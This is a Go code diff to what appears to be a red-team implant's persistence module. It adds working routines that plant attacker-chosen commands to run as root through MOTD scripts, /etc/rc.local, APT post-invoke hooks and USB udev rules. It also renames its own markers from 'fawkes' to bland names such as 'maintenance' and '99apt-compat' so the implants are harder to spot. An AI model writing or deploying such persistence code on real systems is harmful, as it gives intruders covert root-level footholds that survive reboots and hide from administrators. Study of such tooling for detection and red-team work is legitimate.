@@ -6,7 +6,6 @@ package commands
 import (
 	"fmt"
 	"os"
-	"os/exec"
 	"os/user"
 	"path/filepath"
 	"strings"
@@ -28,10 +27,10 @@ func persistShellProfile(args persistArgs) structs.CommandResult {
 
 func persistShellProfileInstall(args persistArgs) structs.CommandResult {
 	if args.Path == "" {
-		return errorResult("Error: path (command to execute on login) is required")
+		return errorResult("path (command to execute on login) is required")
 	}
 
-	marker := "fawkes"
+	marker := "maintenance"
 	if args.Name != "" {
 		marker = args.Name
 	}
@@ -69,7 +68,7 @@ func persistShellProfileInstall(args persistArgs) structs.CommandResult {
 }
 
 func persistShellProfileRemove(args persistArgs) structs.CommandResult {
-	marker := "fawkes"
+	marker := "maintenance"
 	if args.Name != "" {
 		marker = args.Name
 	}
@@ -143,10 +142,10 @@ func persistSSHKey(args persistArgs) structs.CommandResult {
 
 func persistSSHKeyInstall(args persistArgs) structs.CommandResult {
 	if args.Path == "" {
-		return errorResult("Error: path (SSH public key string) is required")
+		return errorResult("path (SSH public key string) is required")
 	}
 
-	marker := "fawkes"
+	marker := "maintenance"
 	if args.Name != "" {
 		marker = args.Name
 	}
@@ -188,7 +187,7 @@ func persistSSHKeyInstall(args persistArgs) structs.CommandResult {
 }
 
 func persistSSHKeyRemove(args persistArgs) structs.CommandResult {
-	marker := "fawkes"
+	marker := "maintenance"
 	if args.Name != "" {
 		marker = args.Name
 	}
@@ -245,7 +244,7 @@ func persistXDGAutostart(args persistArgs) structs.CommandResult {
 
 func persistXDGAutostartInstall(args persistArgs) structs.CommandResult {
 	if args.Path == "" {
-		return errorResult("Error: path (executable to persist) is required")
+		return errorResult("path (executable to persist) is required")
 	}
 	if args.Name == "" {
 		args.Name = "system-update-notifier"
@@ -316,6 +315,303 @@ func persistXDGAutostartRemove(args persistArgs) structs.CommandResult {
 	return successf("Removed XDG autostart persistence: %s", desktopFile)
 }
 
+// persistMOTD installs/removes scripts in /etc/update-motd.d/ that execute on SSH login (T1546).
+// Scripts must be executable and are run in lexical order as root when a user logs in.
+func persistMOTD(args persistArgs) structs.CommandResult {
+	switch args.Action {
+	case "install":
+		return persistMOTDInstall(args)
+	case "remove":
+		return persistMOTDRemove(args)
+	default:
+		return errorf("Unknown action: %s. Use: install, remove", args.Action)
+	}
+}
+
+func persistMOTDInstall(args persistArgs) structs.CommandResult {
+	if args.Path == "" {
+		return errorResult("path (command or script to execute on login) is required")
+	}
+
+	name := "99-motd-check"
+	if args.Name != "" {
+		name = args.Name
+	}
+
+	motdDir := "/etc/update-motd.d"
+	if _, err := os.Stat(motdDir); os.IsNotExist(err) {
+		return errorf("Directory %s does not exist — update-motd not available on this system", motdDir)
+	}
+
+	scriptPath := filepath.Join(motdDir, name)
+	if _, err := os.Stat(scriptPath); err == nil {
+		return errorf("MOTD script already exists: %s. Remove first.", scriptPath)
+	}
+
+	content := fmt.Sprintf("#!/bin/sh\n# system-check: %s\nnohup %s >/dev/null 2>&1 &\n", name, args.Path)
+
+	if err := os.WriteFile(scriptPath, []byte(content), 0755); err != nil {
+		return errorf("Failed to write %s: %v (requires root)", scriptPath, err)
+	}
+
+	return successf("MOTD persistence installed:\n  File: %s\n  Command: %s\n  Trigger: Runs as root on each SSH/console login\n\nRemove with: persist -method motd -action remove -name %s", scriptPath, args.Path, name)
+}
+
+func persistMOTDRemove(args persistArgs) structs.CommandResult {
+	name := "99-motd-check"
+	if args.Name != "" {
+		name = args.Name
+	}
+
+	scriptPath := filepath.Join("/etc/update-motd.d", name)
+	if _, err := os.Stat(scriptPath); err != nil {
+		return errorf("MOTD script not found: %s", scriptPath)
+	}
+
+	secureRemove(scriptPath)
+
+	if _, err := os.Stat(scriptPath); err == nil {
+		return errorf("Failed to remove %s: file still exists", scriptPath)
+	}
+
+	return successf("Removed MOTD persistence: %s", scriptPath)
+}
+
+// persistRCLocal appends/removes commands in /etc/rc.local (T1037.004).
+// rc.local runs at the end of multi-user boot as root.
+func persistRCLocal(args persistArgs) structs.CommandResult {
+	switch args.Action {
+	case "install":
+		return persistRCLocalInstall(args)
+	case "remove":
+		return persistRCLocalRemove(args)
+	default:
+		return errorf("Unknown action: %s. Use: install, remove", args.Action)
+	}
+}
+
+func persistRCLocalInstall(args persistArgs) structs.CommandResult {
+	if args.Path == "" {
+		return errorResult("path (command to execute at boot) is required")
+	}
+
+	marker := "maintenance"
+	if args.Name != "" {
+		marker = args.Name
+	}
+
+	rcPath := "/etc/rc.local"
+
+	existing, _ := os.ReadFile(rcPath)
+	content := string(existing)
+
+	if strings.Contains(content, marker) {
+		return errorf("rc.local already contains marker '%s'. Remove first.", marker)
+	}
+
+	entry := fmt.Sprintf("# BEGIN %s\nnohup %s >/dev/null 2>&1 &\n# END %s\n", marker, args.Path, marker)
+
+	if content == "" {
+		content = "#!/bin/sh\n" + entry + "exit 0\n"
+	} else {
+		// Insert before "exit 0" if present
+		if idx := strings.LastIndex(content, "exit 0"); idx >= 0 {
+			content = content[:idx] + entry + content[idx:]
+		} else {
+			content += "\n" + entry
+		}
+	}
+
+	if err := os.WriteFile(rcPath, []byte(content), 0755); err != nil {
+		return errorf("Failed to write %s: %v (requires root)", rcPath, err)
+	}
+
+	return successf("rc.local persistence installed:\n  File: %s\n  Command: %s\n  Marker: %s\n  Trigger: Runs as root at system boot\n\nRemove with: persist -method rc-local -action remove -name %s", rcPath, args.Path, marker, marker)
+}
+
+func persistRCLocalRemove(args persistArgs) structs.CommandResult {
+	marker := "maintenance"
+	if args.Name != "" {
+		marker = args.Name
+	}
+
+	rcPath := "/etc/rc.local"
+	data, err := os.ReadFile(rcPath)
+	if err != nil {
+		return errorf("Failed to read %s: %v", rcPath, err)
+	}
+
+	content := string(data)
+	beginTag := fmt.Sprintf("# BEGIN %s", marker)
+	endTag := fmt.Sprintf("# END %s", marker)
+
+	if !strings.Contains(content, beginTag) {
+		return errorf("No rc.local entry found with marker '%s'", marker)
+	}
+
+	lines := strings.Split(content, "\n")
+	var filtered []string
+	inBlock := false
+	for _, line := range lines {
+		if strings.Contains(line, beginTag) {
+			inBlock = true
+			continue
+		}
+		if strings.Contains(line, endTag) {
+			inBlock = false
+			continue
+		}
+		if !inBlock {
+			filtered = append(filtered, line)
+		}
+	}
+
+	if err := os.WriteFile(rcPath, []byte(strings.Join(filtered, "\n")), 0755); err != nil {
+		return errorf("Failed to write %s: %v", rcPath, err)
+	}
+
+	return successf("Removed rc.local persistence with marker '%s'", marker)
+}
+
+// persistAPTHook installs/removes APT post-invoke hooks in /etc/apt/apt.conf.d/ (T1546).
+// Hooks execute as root whenever apt install/upgrade/update runs.
+func persistAPTHook(args persistArgs) structs.CommandResult {
+	switch args.Action {
+	case "install":
+		return persistAPTHookInstall(args)
+	case "remove":
+		return persistAPTHookRemove(args)
+	default:
+		return errorf("Unknown action: %s. Use: install, remove", args.Action)
+	}
+}
+
+func persistAPTHookInstall(args persistArgs) structs.CommandResult {
+	if args.Path == "" {
+		return errorResult("path (command to execute on apt operations) is required")
+	}
+
+	name := "99apt-compat"
+	if args.Name != "" {
+		name = args.Name
+	}
+
+	aptDir := "/etc/apt/apt.conf.d"
+	if _, err := os.Stat(aptDir); os.IsNotExist(err) {
+		return errorf("Directory %s does not exist — APT not available on this system", aptDir)
+	}
+
+	hookPath := filepath.Join(aptDir, name)
+	if _, err := os.Stat(hookPath); err == nil {
+		return errorf("APT hook already exists: %s. Remove first.", hookPath)
+	}
+
+	content := fmt.Sprintf(`APT::Update::Post-Invoke-Success {"%s >/dev/null 2>&1 &";};
+DPkg::Post-Invoke {"%s >/dev/null 2>&1 &";};
+`, args.Path, args.Path)
+
+	if err := os.WriteFile(hookPath, []byte(content), 0644); err != nil {
+		return errorf("Failed to write %s: %v (requires root)", hookPath, err)
+	}
+
+	return successf("APT hook persistence installed:\n  File: %s\n  Command: %s\n  Triggers: apt update (Post-Invoke-Success) and apt install/upgrade (DPkg::Post-Invoke)\n\nRemove with: persist -method apt-hook -action remove -name %s", hookPath, args.Path, name)
+}
+
+func persistAPTHookRemove(args persistArgs) structs.CommandResult {
+	name := "99apt-compat"
+	if args.Name != "" {
+		name = args.Name
+	}
+
+	hookPath := filepath.Join("/etc/apt/apt.conf.d", name)
+	if _, err := os.Stat(hookPath); err != nil {
+		return errorf("APT hook not found: %s", hookPath)
+	}
+
+	secureRemove(hookPath)
+
+	if _, err := os.Stat(hookPath); err == nil {
+		return errorf("Failed to remove %s: file still exists", hookPath)
+	}
+
+	return successf("Removed APT hook persistence: %s", hookPath)
+}
+
+// persistUdevRule installs/removes a udev rule in /etc/udev/rules.d/ that triggers
+// on device events (T1546). Rules run as root when matching devices are plugged in,
+// or on systemd-based systems, on startup via udevadm trigger.
+func persistUdevRule(args persistArgs) structs.CommandResult {
+	switch args.Action {
+	case "install":
+		return persistUdevRuleInstall(args)
+	case "remove":
+		return persistUdevRuleRemove(args)
+	default:
+		return errorf("Unknown action: %s. Use: install, remove", args.Action)
+	}
+}
+
+func persistUdevRuleInstall(args persistArgs) structs.CommandResult {
+	if args.Path == "" {
+		return errorResult("path (command to execute on device event) is required")
+	}
+
+	name := "99-usb-compat.rules"
+	if args.Name != "" {
+		if !strings.HasSuffix(args.Name, ".rules") {
+			name = args.Name + ".rules"
+		} else {
+			name = args.Name
+		}
+	}
+
+	udevDir := "/etc/udev/rules.d"
+	if _, err := os.Stat(udevDir); os.IsNotExist(err) {
+		return errorf("Directory %s does not exist — udev not available on this system", udevDir)
+	}
+
+	rulePath := filepath.Join(udevDir, name)
+	if _, err := os.Stat(rulePath); err == nil {
+		return errorf("Udev rule already exists: %s. Remove first.", rulePath)
+	}
+
+	// ACTION=="add" triggers on any device add (common: USB, network, etc.)
+	// RUN+= executes the command as root
+	content := fmt.Sprintf(`# system-check: %s
+ACTION=="add", SUBSYSTEM=="usb", RUN+="%s"
+`, name, args.Path)
+
+	if err := os.WriteFile(rulePath, []byte(content), 0644); err != nil {
+		return errorf("Failed to write %s: %v (requires root)", rulePath, err)
+	}
+
+	return successf("Udev rule persistence installed:\n  File: %s\n  Command: %s\n  Trigger: Runs as root when USB device is connected\n  Note: Run 'udevadm control --reload-rules' to activate immediately\n\nRemove with: persist -method udev-rule -action remove -name %s", rulePath, args.Path, name)
+}
+
+func persistUdevRuleRemove(args persistArgs) structs.CommandResult {
+	name := "99-usb-compat.rules"
+	if args.Name != "" {
+		if !strings.HasSuffix(args.Name, ".rules") {
+			name = args.Name + ".rules"
+		} else {
+			name = args.Name
+		}
+	}
+
+	rulePath := filepath.Join("/etc/udev/rules.d", name)
+	if _, err := os.Stat(rulePath); err != nil {
+		return errorf("Udev rule not found: %s", rulePath)
+	}
+
+	secureRemove(rulePath)
+
+	if _, err := os.Stat(rulePath); err == nil {
+		return errorf("Failed to remove %s: file still exists", rulePath)
+	}
+
+	return successf("Removed udev rule persistence: %s", rulePath)
+}
+
 // persistLinuxList lists all installed persistence methods
 func persistLinuxList() structs.CommandResult {
 	var sb strings.Builder
@@ -323,7 +619,7 @@ func persistLinuxList() structs.CommandResult {
 
 	// Check crontab
 	sb.WriteString("[Crontab]\n")
-	cmd := exec.Command("crontab", "-l")
+	cmd := safeCmd("crontab", "-l")
 	if output, err := cmd.CombinedOutput(); err == nil {
 		lines := strings.Split(string(output), "\n")
 		for _, line := range lines {
